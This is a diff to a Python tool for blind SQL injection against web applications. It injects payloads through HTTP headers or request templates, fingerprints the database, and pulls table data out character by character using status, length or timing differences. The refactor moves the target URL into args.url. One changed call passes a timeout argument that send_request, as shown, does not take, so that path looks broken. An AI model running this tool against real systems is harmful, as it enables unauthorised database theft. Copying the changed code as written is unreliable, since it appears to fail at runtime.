@@ -23,7 +23,7 @@ def usage():
 
     Optional Arguments:
         -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
-        -sh, --static-header         Static headers as key-value pairs that do not contain payloads
+        -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
         -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
         -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
         -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
@@ -65,7 +65,7 @@ version_queries = load_version_queries()
 
 # Main Logic
 
-def is_injectable(url, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
     
     test_payloads = {
         "true_condition": "' AND '1'='1",
@@ -86,8 +86,7 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
             print(f"[VERBOSE] Payload: {payload} | Encoded Payload: {encoded_payload}")
         
         try:
-            response, response_time = injection(
-                url=url, 
+            response, response_time = injection( 
                 encoded_payload=encoded_payload, 
                 request_template=request_template, 
                 injectable_headers=injectable_headers, 
@@ -114,7 +113,6 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
                 print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
                 print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
                 print(f"[VERBOSE] Request time: {response_time} seconds")
-                print(f"[VERBOSE] Response Headers: {response.headers}")
 
         except requests.exceptions.RequestException as e:
             print(f"[-] Error during {condition} injection request: {e}")
@@ -157,7 +155,7 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
     print("[-] No significant status code, content length, or keyword differences detected. header is likely not injectable.")
     return False, None
 
-def detect_database(url, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
+def detect_database(request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
     
     print("[*] Attempting to detect the database type...")
 
@@ -167,7 +165,7 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
     # Step 1: Baseline request
     try:
         response, baseline_status_code, baseline_content_length, _ = baseline_request(
-            url, request_template, injectable_headers, static_headers, args
+            request_template, injectable_headers, static_headers, args
         )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
@@ -179,7 +177,6 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
         sleep_query = info.get("sleep_function", None)
 
         detected_db, substring_function = detection(
-            url=url,
             db_name=db_name,
             query=db_query,
             sleep_query=sleep_query,
@@ -196,7 +193,7 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
     print(f"[-] Unable to detect the database type using regular and sleep-based methods.")
     return None, None
 
-def discover_length(url, table, column, where_clause, db_name, detection="status", max_length=1000, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, detection="status", max_length=1000, request_template=None, injectable_headers={}, static_headers={}, args=None):
 
     if db_name not in version_queries:
         print(f"[-] Database {db_name} not found in version queries.")
@@ -225,7 +222,6 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
 
             try:
                 response, response_time = injection(
-                    url=url,
                     encoded_payload=encoded_payload,
                     request_template=request_template,
                     injectable_headers=injectable_headers,
@@ -260,7 +256,7 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
     # Step 1: Baseline request
     try:
         response, baseline_status_code, baseline_content_length, _ = baseline_request(
-            url, request_template, injectable_headers, static_headers, args
+            request_template, injectable_headers, static_headers, args
         )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
@@ -274,7 +270,6 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
 
         try:
             response, _ = injection(
-                url=url,
                 encoded_payload=encoded_payload,
                 request_template=request_template,
                 injectable_headers=injectable_headers,
@@ -319,7 +314,7 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
         print(f"[-] Failed to discover data length within the maximum length {max_length}.")
         return None
 
-def extract_data(url, table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
+def extract_data(table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
 
     extracted_data = ""
     wordlist = None
@@ -348,7 +343,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
     # Step 1: Baseline request
     try:
         response, baseline_status_code, baseline_content_length, _ = baseline_request(
-            url, request_template, injectable_headers, static_headers, args
+            request_template, injectable_headers, static_headers, args
         )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
@@ -365,7 +360,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                 encoded_payload = quote(payload)
 
                 result = extract_value(
-                    url, table, column, where_clause, string_function, position, chr(mid),
+                    table, column, where_clause, string_function, position, chr(mid),
                     request_template, injectable_headers, static_headers,
                     extraction, baseline_status_code, baseline_content_length,
                     db_name=db_name, encoded_payload=encoded_payload, args=args
@@ -401,7 +396,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
                 continue
 
             result = extract_value(
-                url, table, column, where_clause, string_function, position, value, 
+                table, column, where_clause, string_function, position, value, 
                 request_template, injectable_headers, static_headers, 
                 extraction, baseline_status_code, baseline_content_length, 
                 db_name=db_name, args=args
@@ -520,7 +515,7 @@ def send_request(url=None, headers=None, body=None, method="GET", args=None):
         print(f"[-] Error during {method} request: {e}")
         return None
 
-def baseline_request(url, request_template, injectable_headers, static_headers, args):
+def baseline_request(request_template, injectable_headers, static_headers, args):
 
     start_time = time.time()
 
@@ -530,9 +525,9 @@ def baseline_request(url, request_template, injectable_headers, static_headers, 
     else:
         headers = {**static_headers, **injectable_headers}
         if args.data:
-            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+            response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
         else:
-            response = requests.get(url, headers=headers, timeout=args.timeout)
+            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)
 
     end_time = time.time()
     baseline_status_code = response.status_code
@@ -545,7 +540,7 @@ def baseline_request(url, request_template, injectable_headers, static_headers, 
 
     return response, baseline_status_code, baseline_content_length, response_time
 
-def injection(url, encoded_payload, request_template, injectable_headers, static_headers, args):
+def injection(encoded_payload, request_template, injectable_headers, static_headers, args):
 
     try:
         start_time = time.time()
@@ -553,15 +548,15 @@ def injection(url, encoded_payload, request_template, injectable_headers, static
         if request_template:
             injected_template = request_template.replace("INJECT", encoded_payload)
             method, url, headers, body = parse_request(injected_template)
-            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
+            response = send_request(method=method, url=url, headers=headers, body=body, timeout=args.timeout)
         else:
             headers = {**static_headers}
             for key, value in injectable_headers.items():
                 headers[key] = value + encoded_payload
             if args.data:
-                response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
             else:
-                response = requests.get(url, headers=headers, timeout=args.timeout)
+                response = requests.get(url=args.url, headers=headers, timeout=args.timeout)
 
         end_time = time.time()
         response_time = end_time - start_time
@@ -577,7 +572,7 @@ def injection(url, encoded_payload, request_template, injectable_headers, static
         print(f"[-] Error during request: {e}")
         return None, None
 
-def detection(url, db_name, query, sleep_query, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
+def detection(db_name, query, sleep_query, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
    
     if args.verbose:
         print(f"[VERBOSE] Detection method: {detection}")
@@ -598,7 +593,6 @@ def detection(url, db_name, query, sleep_query, request_template=None, injectabl
 
             try:
                 response, response_time = injection(
-                    url=url,
                     encoded_payload=encoded_payload,
                     request_template=request_template,
                     injectable_headers=injectable_headers,
@@ -633,7 +627,6 @@ def detection(url, db_name, query, sleep_query, request_template=None, injectabl
 
     try:
         response, response_time = injection(
-            url=url,
             encoded_payload=encoded_payload,
             request_template=request_template,
             injectable_headers=injectable_headers,
@@ -671,7 +664,7 @@ def detection(url, db_name, query, sleep_query, request_template=None, injectabl
 
     return None, None
 
-def extract_value(url, table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, encoded_payload=None, args=None):
+def extract_value(table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, encoded_payload=None, args=None):
 
     if not encoded_payload:
         value_length = len(value)
@@ -696,7 +689,6 @@ def extract_value(url, table, column, where_clause, string_function, position, v
             print(f"[VERBOSE] Querying Database: {db_name if args.sleep_only else 'Regular'} with payload: {encoded_payload}")
 
         response, response_time = injection(
-            url=url,
             encoded_payload=encoded_payload,
             request_template=request_template,
             injectable_headers=injectable_headers,
@@ -744,7 +736,7 @@ def main():
 
     parser.add_argument('-u', '--url', required=True, help="Target URL")
     parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
-    parser.add_argument('-sh', '--static-header', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
+    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
     parser.add_argument('-d','--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
     parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
     parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
@@ -784,7 +776,7 @@ def main():
         return
 
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
-    static_headers = dict(args.static_header) if args.static_header else {}
+    static_headers = dict(args.static_headers) if args.static_headers else {}
 
     request_template = None
     if args.file:
